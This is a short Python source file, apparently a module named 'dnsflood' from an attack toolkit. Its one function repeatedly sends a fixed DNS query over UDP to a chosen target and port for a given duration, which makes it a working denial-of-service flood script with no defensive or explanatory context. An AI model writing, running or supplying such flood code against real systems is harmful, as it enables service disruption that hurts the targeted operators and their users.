# attacks/dnsflood.py

import socket
import time
import struct

def attack(target, port, duration):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    end_time = time.time() + duration

    while time.time() < end_time:
        dns_query = b'\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x07example\x03com\x00\x00\x01\x00\x01'
        sock.sendto(dns_query, (target, port))

    sock.close()
